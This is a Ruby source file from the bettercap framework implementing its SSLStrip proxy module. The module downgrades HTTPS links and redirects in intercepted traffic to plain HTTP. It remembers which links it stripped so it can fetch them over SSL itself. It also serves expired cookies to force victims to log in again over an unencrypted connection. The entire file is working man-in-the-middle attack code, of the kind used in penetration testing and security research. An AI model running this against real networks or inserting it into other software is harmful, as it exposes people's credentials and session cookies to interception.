=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

module BetterCap
module Proxy
module SSLStrip

# Handle SSL stripping.
class Strip
  # Maximum number of redirects to detect a HTTPS redirect loop.
  MAX_REDIRECTS = 3
  # Regular expression used to parse HTTPS urls.
  HTTPS_URL_RE = /(https:\/\/[^"'\/]+)/i

  # Create an instance of this object.
  def initialize
    @urls    = URLMonitor.new
    @cookies = CookieMonitor.new
  end

  # Check if the +request+ is a result of a stripped link/redirect and handle
  # cookies cleaning.
  # Return a response object or nil if the request must be performed.
  def preprocess( request )
    # check for cookies.
    unless @cookies.is_clean?(request)
      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Sending expired cookies for '#{request.host}'."
      expired = @cookies.get_expired_headers!(request)

      return build_expired_cookies( expired, request )
    end

    # check for stripped urls.
    link = @urls.normalize( request.host )
    if request.port == 80 and @urls.was_stripped?( request.client, link )
      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Found stripped HTTPS link '#{link}', proxying via SSL."
      request.port = 443
    end

    nil
  end

  # Process the +request+ and if it's a redirect to a HTTPS url patch the
  # Location header and retry.
  # Process the +response+ and replace every https link in its body with
  # http counterparts.
  def process( request, response )
    # check for a redirect
    if response['Location'].start_with?('https://')
      link = @urls.normalize( response['Location'] )
      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS '#{link}'."
      @urls.add!( request.client, link )

      # The request will be retried on port 443 if MAX_REDIRECTS is not reached.
      request.port = 443
      # If MAX_REDIRECTS is reached, the 'Location' header will be used.
      response['Location'] = @urls.downgrade( response['Location'] )

      # retry the request if possible
      return true
    end

    # parse body
    links = []
    response.body.scan( HTTPS_URL_RE ).uniq.each do |link|
      if link[0].include?('.')
        link       = @urls.normalize( link[0] )
        downgraded = @urls.downgrade( link )

        links << [link, downgraded]
      end
    end

    unless links.empty?
      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Stripping #{links.size} HTTPS link#{if links.size > 1 then 's' else '' end} inside '#{request.to_url}'."

      links.each do |l|
        link, downgraded = l
        @urls.add!( request.client, link )
        response.body.gsub!( link, downgraded )
      end
    end

    # do not retry the request.
    false
  end

  private

  def build_expired_cookies( expired, request )
    resp = Response.new

    resp << "HTTP/1.1 302 Moved"
    resp << "Connection: close"
    resp << "Location: http://#{request.host}#{request.url}"

    expired.each do |cookie|
      resp << "Set-Cookie: #{cookie}"
    end

    resp
  end
end

end
end
end
